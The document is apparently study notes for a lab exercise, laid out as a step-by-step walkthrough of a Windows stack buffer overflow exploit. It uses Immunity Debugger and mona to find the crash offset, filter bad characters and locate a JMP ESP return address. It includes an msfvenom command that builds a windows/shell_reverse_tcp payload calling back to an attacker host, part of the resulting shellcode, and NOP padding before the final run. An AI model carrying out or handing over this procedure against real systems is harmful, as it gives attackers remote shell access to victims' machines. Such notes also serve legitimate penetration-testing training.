# Bufferoverflow
## Setup & Configuration
1. Run Immunity debugger as administrator
2. Run the below command to setup Immunity Debugger

`!mona config -set workingfolder c:\mona\`

3. Run application manually
4. Check Taskmanager for the process ID
5. Check netstat for the corresponding PID to see what port it is running on

## Manual method
1. Generate payload on linux machine if it doesn't crash program just create a bigger payload. 

`msf-pattern_create -l 5000`

2. Make a connection to the application (nc) and paste the payload

3. Find the offset using mona script

`!mona findmsp -distance 5000`

![Execute Exploit](images/exploit2.png)

![Execute Exploit](images/exploit1.png)

4. Generate a payload with the below script to verify the offset. Replace '1000' with the value of the offset. 

`python -c "print('A' * 1000 + 'BBBB')"`

5. Copy the exploit.py file to the local directory

`cp /root/templates/exploit.py .`

6. Input below command into mona and rerun the program. 

`!mona bytearray -b "\x00"`

7. Run bad.py to generate a list of bad characters and copy this to the clipboard. 

`python /root/bad.py`

8. Open the exploit in nano. Then change the IP address. If necessary the prefix. Set the retn to be 'BBBB'. Then paste the bad chars into the payload. Also change the offset to the one found earlier. 

9. Set <address> to the ESP Address and run in Immunity Debugger

`!mona compare -f C:\mona\bytearray.bin -a <address>`

10. Copy bad chars and add to the mona byte array command and run it (Remember if 2 in a row likely only the first is bad so remove it first then try again)

`!mona bytearray -b "\x00\x01"`

11. Remove bad chars from the payload in exploit.py
12. Restart program in Immunity Debugger then run exploit again
13. Recheck for bad chars and redo process until all are gone. 

`!mona compare -f C:\mona\bytearray.bin -a <address>`

14. Find the jump point be sure to add all bad chars. Can be run either with program running or crashed state. 

`!mona jmp -r esp -cpb "\x00"`

15. Choose an address and update your exploit.py script, setting the "retn" variable to the address, written backwards (since the system is little endian). For example if the address is \x01\x02\x03\x04 in Immunity, write it as \x04\x03\x02\x01 in your exploit.

16. Generate exploit be sure to add all found bad characters. 

`msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f c`

17. Add payload the exploit.py so it looks like below. 

```
payload = ("\xfc\xbb\xa1\x8a\x96\xa2\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x5d\x62\x14\xa2\x9d"
...
"\xf7\x04\x44\x8d\x88\xf2\x54\xe4\x8d\xbf\xd2\x15\xfc\xd0\xb6"
"\x19\x53\xd0\x92\x19\x53\x2e\x1d")
```
18. Prepend NOPs. Modify padding section of exploit.py as below. 

```
padding = "\x90" * 16
```

20. Run exploit